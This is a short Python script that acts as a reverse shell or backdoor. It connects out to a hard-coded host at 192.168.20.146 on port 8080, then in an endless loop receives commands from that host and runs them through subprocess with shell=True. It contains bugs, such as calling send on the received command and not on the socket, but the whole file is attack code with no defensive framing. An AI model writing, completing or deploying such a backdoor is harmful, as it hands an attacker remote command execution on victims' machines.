import socket
import subprocess


def execute_system_command(command):
    return subprocess.check_output(command, shell=True)


if __name__ == "__main__":

    ip = "192.168.20.146"
    port = 8080

    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connection.connect((ip, port))

    connection.send("\n [+] Connetction esteblished")

    while True:
        command = connection.recv(1024)     # listen port and waiting command
        command_result = execute_system_command(command)
        command.send(command_result)

    connection.close()

